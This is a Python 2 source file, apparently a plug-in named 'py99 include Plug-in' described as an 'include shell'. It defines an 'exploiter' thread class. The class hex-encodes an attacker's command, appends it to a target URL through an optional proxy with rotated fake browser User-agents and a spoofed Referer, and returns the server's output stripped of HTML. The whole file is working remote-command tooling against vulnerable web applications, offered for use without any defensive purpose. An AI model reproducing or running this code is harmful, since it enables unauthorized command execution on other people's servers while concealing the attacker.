#-*- coding: utf-8 -*-
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import urllib2, random,  sys
try: multi
except NameError: from threading import Thread as multi

__module_Author__ = "Handrix"
__module_name__ = "py99 include Plug-in"
__module_version__ = "1.0"
__module_description__ = "include shell"


class exploiter(multi):
    global headers
    headers=[[('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)')],
       [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')],
       [('User-agent', 'Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)')],
       [('User-agent', 'Mozilla/5.0 (compatible; MSIE 4.0; Windows NT)')],
       [('User-agent', 'Mozilla/5.0 (compatible; MSIE 5.5; Windows NT)')],
       [('User-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT)')],
       [("IE 7 Vista","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)")],
       [("Googlebot 2.1","Googlebot/2.1 (http://www.google.com/bot.html)")],
       [("Opera 9 (final) WinXP","Opera/9.00 (Windows NT 5.1; U; en)")],
       [("MSN Bot","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)")],
       [("MSIE6 WinXP","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")]]

    def __init__(self, exploit, proxy, target, url, cmd):
        multi.__init__(self)
        self.exploit = exploit
        self.proxy   = proxy 
        self.target  = target
        self.url     = url
        self.cmd     = self.toHex(cmd)

    def GetSite(self):
        """ if you got a good proxy uncomment these lines"""
        if self.proxy is not None and self.proxy !="":
       #proxy syntax => proxy:port 
            prox = "http://"+self.proxy
            proxies = urllib2.ProxyHandler({"http" : prox})
            opener = urllib2.build_opener(proxies)
        else:
            opener = urllib2.build_opener()
        i = random.randrange(0,6,1)
        opener.addheaders = headers[i]
        urllib2.install_opener(opener)
        req = urllib2.Request(self.url+self.cmd)
        req.add_header('Referer', 'http://www.poc.com/')
        f = urllib2.urlopen(req)
        return  f.read()
        f.close()

        
    def toHex(self, s):
        lst = []
        s=str(s).decode('utf8').encode('iso-8859-1')
        for ch in str(s):
            hv = hex(ord(ch)).replace('0x', '%')
            if len(hv) == 1:
                hv = '0'+hv
            lst.append(hv)
        return reduce(lambda x,y:x+y, lst)


    def html_to_text(self, s):
      """
      Given an HTML formatted str, convert it to a text str.
      """
      s = s.replace('&amp;', '&')
      s = s.replace('&lt;', '<')
      s = s.replace('&gt;', '>')
      s = s.replace('&quot;', '"')
      s = s.replace('&middot;', '\xb7')
      for i in range(256):
        s = s.replace('&#%d;' % i, chr(i))

      return s

    def StripTags(self, text):
       finished = 0
       while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]                
                 finished = 0
       return text


    def GetData(self): 
        #self.cmd=self.toHex(self.cmd)
        data=self.GetSite()
        data=self.StripTags(data)
        data=self.html_to_text(data)
        return data.strip()

            
     

